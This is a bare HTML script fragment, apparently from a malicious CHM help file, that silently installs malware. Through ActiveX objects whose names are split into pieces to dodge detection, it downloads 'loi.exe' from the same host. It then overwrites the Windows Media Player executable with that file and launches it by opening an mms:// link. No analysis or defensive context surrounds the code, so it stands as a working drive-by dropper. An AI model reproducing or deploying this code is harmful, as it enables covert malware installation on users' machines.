<!-- VVZkV2RXSXpaeja1 -->
<SCRIPT LANGUAGE="javascript">

    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('LOI.CHM')
        return url.substring(start, end);
    }

    tehaa = 'ADO' + 'DB' + '.St' + 'ream';
    tehao = 'Micro' + 'soft.XM' + 'LHTTP';
    tehex = '.exe';
    tehwmp = 'C:\\Pr' + 'ogram Files\\Win' + 'dows Media Player\\wmpl' + 'ayer' + tehex;
    tehmms = 'm' + 'm' + 's' + ':/' + '/';

    var tehf = new ActiveXObject(tehaa);
    tehf.Mode = 3;
    tehf.Type = 1;
    
    tehgURLf = getPath(location.href)+'loi' + tehex;
    
    var tehg = new ActiveXObject(tehao); 
    tehg.Open("GET",tehgURLf,0); 
    tehg.Send(); 
    
    tehf.Open();
    tehf.Write(tehg.responseBody);

    tehf.SaveToFile(tehwmp,2);
    location.href = tehmms;
    
</SCRIPT>
<!-- VVZkV2RXSXpaeja1 -->
